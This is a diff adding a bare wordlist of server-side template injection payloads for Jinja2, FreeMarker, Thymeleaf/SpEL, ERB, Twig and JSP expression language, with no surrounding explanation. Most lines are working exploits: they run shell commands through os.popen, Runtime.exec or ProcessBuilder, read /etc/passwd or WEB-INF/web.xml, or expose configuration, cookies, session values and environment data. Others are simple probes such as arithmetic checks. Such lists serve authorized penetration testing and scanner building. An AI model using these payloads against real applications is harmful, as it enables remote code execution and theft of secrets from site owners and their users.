@@ -1,0 +1,89 @@
+${7*7}
+{{7*7}}
+{{7*'7'}}
+${7*'7'}
+{{config.items()}}
+{{self}}
+{{self.__dict__}}
+{{globals()}}
+{{locals()}}
+{{1/0}}
+{{request.environ}}
+{{request.application.__globals__}}
+{{request.url_rule.methods[0]}}
+{{request.args}}
+{{request.form}}
+{{request.headers}}
+{{request.cookies}}
+{{request.remote_addr}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__base__.__subclasses__()}}
+{{''.__class__.__bases__[0].__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{{().__class__.__base__.__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd', 'r').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].os.popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
+{{''.__class__.__mro__[2].__subclasses__()[133].__init__.__globals__['popen']('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{self.__init__.__globals__['os'].popen('id').read()}}
+{{g.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{app.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{get_flashed_messages.__globals__['os'].popen('id').read()}}
+{{url_for.__globals__['os'].popen('id').read()}}
+{{request.__init__.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__['os'].popen('id').read()}}
+{{joiner.__init__.__globals__['os'].popen('id').read()}}
+{{namespace.__init__.__globals__['os'].popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{dict.__init__.__globals__['os'].popen('id').read()}}
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval('__import__("os").popen("id").read()') }}{% endif %}{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__ == "WarningMessage" %}{{x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("ls").read()')}}{%endif%}{%endfor%}
+{% set user_code = '__import__("os").popen("id").read()' %} {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {{ c.__init__.__globals__['__builtins__'].eval(user_code) }} {% endif %} {% endfor %}
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+[#assign ex="freemarker.template.utility.Execute"?new()] ${ ex("id") }
+*{"\x40java.lang.Runtime@getRuntime().exec('id')"}
+@{java.lang.Runtime@getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${new java.lang.ProcessBuilder({'id'}).start()}
+${new String(new byte[]{97, 108, 101, 114, 116, 40, 49, 41})}
+<%= `id` %>
+<%= system('id') %>
+<%= IO.popen('id').readlines() %>
+<%= File.open('/etc/passwd').read %>
+<% \`id\` %>
+<% system('id') %>
+<% IO.popen('id').readlines() %>
+<% File.open('/etc/passwd').read %>
+{% include "id" %}
+{% import "os" as os %} {{ os.popen("id").read() }}
+{{ "id"|shell }}
+{{ "id"|system }}
+{{ "id"|passthru }}
+{{ "id"|exec }}
+{{ "id"|popen }}
+{{ "id"|eval }}
+{{ "id"|assert }}
+{{ "id"|preg_replace('/.*/e', '\\0', 'id') }}
+{{ "id"|create_function('', 'id') }}
+{{ "id"|ob_start('system') }}
+{{ 'a'.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id') }}
+{{ "".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id").getInputStream().read() }}
+{{ "".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id").getInputStream().readAllBytes() }}
+${request.getServletContext().getResource("/WEB-INF/web.xml").getContent()}
+${request.getSession().getServletContext().getResourceAsStream("/WEB-INF/web.xml")}
+${config.getServletContext().getResourceAsStream("/WEB-INF/web.xml")}
+${application.getResourceAsStream("/WEB-INF/web.xml")}
+${pageContext.servletContext.getResourceAsStream("/WEB-INF/web.xml")}
+${header["User-Agent"]}
+${cookie["JSESSIONID"].value}
+${param["id"]}
+${requestScope["id"]}
+${sessionScope["id"]}
+${applicationScope["id"]}
+${pageScope["id"]}
